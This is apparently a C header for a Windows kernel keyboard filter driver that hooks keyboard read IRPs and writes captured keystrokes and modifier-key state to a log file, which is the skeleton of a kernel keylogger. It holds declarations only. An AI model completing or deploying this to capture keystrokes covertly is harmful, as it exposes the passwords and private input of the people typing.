#ifndef __KeyboardHooker_h__
#define __KeyboardHooker_h__
#include <hidpddi.h>
#include <wmilib.h>
#include <wdf.h>
#include <wdmsec.h> // for SDDLs
#define NTSTRSAFE_LIB
#include <ntstrsafe.h>

typedef struct KEY_STATE
{
	int kSHIFT; //if the shift key is pressed  
	int kCAPSLOCK; //if the caps lock key is pressed down 
	int kCTRL; //if the control key is pressed down 
	int kALT; //if the alt key is pressed down 
}  KEY_STATE;

typedef struct _KLOG_DEVICE_EXTENSION
{
	PDEVICE_OBJECT pKeyboardDevice; //pointer to next keyboard device on device stack 
	PVOID pThreadObj;			//pointer to the worker thread 
	//PETHREAD pMemoryThreadObj;			//pointer to the worker thread 
	int bThreadTerminate;		    //thread terminiation state 
	HANDLE hLogFile;				//handle to file to log keyboard output 
	KEY_STATE kState;				//state of special keys like CTRL, SHIFT, ect 

	//The work queue of IRP information for the keyboard scan codes is managed by this  
	//linked list, semaphore, and spin lock 
	KSEMAPHORE semQueue;
	KSPIN_LOCK lockQueue;
	LIST_ENTRY QueueListHead;
	//PIRP pirp;
	//PKEYBOARD_INPUT_DATA keyboard_input_data;
	//PDEVICE_OBJECT pKeyboardDeviceObject;
}
KLOG_DEVICE_EXTENSION, *PKLOG_DEVICE_EXTENSION;

typedef void *LPVOID;
typedef LPVOID HID_HANDLE;
typedef struct _HID_FUNCS const * PCHID_FUNCS;
enum AutoRepeatState {
	AR_WAIT_FOR_ANY = 0,
	AR_INITIAL_DELAY,
	AR_AUTOREPEATING,
};
typedef UINT32 KEY_STATE_FLAGS;
typedef struct _HID_KBD {
	DWORD dwSig;
	HID_HANDLE hDevice;
	PCHID_FUNCS pHidFuncs;
	PHIDP_PREPARSED_DATA phidpPreparsedData;
	HIDP_CAPS hidpCaps;
	HANDLE hThread;
	HANDLE hOSDevice;
	HANDLE hevClosing;

	DWORD dwMaxUsages;
	KEY_STATE_FLAGS KeyStateFlags;
	PUSAGE_AND_PAGE puapPrevUsages;
	PUSAGE_AND_PAGE puapCurrUsages;
	PUSAGE_AND_PAGE puapBreakUsages;
	PUSAGE_AND_PAGE puapMakeUsages;
	PUSAGE_AND_PAGE puapOldMakeUsages;

	PCHAR  pbOutputBuffer;
	USHORT cbOutputBuffer;

} HID_KBD, *PHID_KBD;






VOID pauseForABit(CSHORT secondsDelay);

_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS PrepHook(IN PDRIVER_OBJECT pDriverObject);
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS HookKeyboard(IN PDEVICE_OBJECT usbBaseKeyboardDeviceObject);
_IRQL_requires_max_(DISPATCH_LEVEL)
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
_IRQL_requires_max_(DISPATCH_LEVEL)
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context);
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS HookIrps(_In_ PDRIVER_OBJECT  DriverObject);
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS SetMajorFunction(_In_ PDRIVER_OBJECT  DriverObject);
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);




#endif
